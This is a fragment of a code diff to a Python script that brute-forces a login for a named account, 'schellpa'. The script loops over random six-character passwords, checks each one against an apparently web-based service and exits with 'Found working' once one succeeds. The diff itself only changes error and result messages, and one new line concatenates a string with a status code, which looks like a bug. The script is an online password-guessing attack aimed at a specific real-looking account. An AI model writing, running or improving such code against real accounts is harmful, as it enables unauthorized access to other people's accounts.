@@ -26,14 +26,14 @@ def check(username, password):
             if err == "":
                 return True
             else:
-                print(err)
+                print(password + ": " + err)
                 return False
         else:
-            print("Fehler LOL2")
+            print("Fehler LOL2 ("+ res.status_code + ")")
             print(res2)
             return False
     else:
-        print("Fehler LOL3"+ res.status_code) 
+        print("Fehler LOL1 ("+ res.status_code + ")") 
         return False
 chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVW1234567890,.-#+^°!"§$%&/()=?{[]}\\;:_\'*~'
 charlenght = len(chars)
@@ -42,6 +42,6 @@ def numtostring(num):
 while True:
     passwd = numtostring(math.floor(random.random() * math.pow(charlenght, 6)))
     if check("schellpa",passwd):
-        print(passwd)
+        print("Found working: " + passwd)
         sys.exit()
         
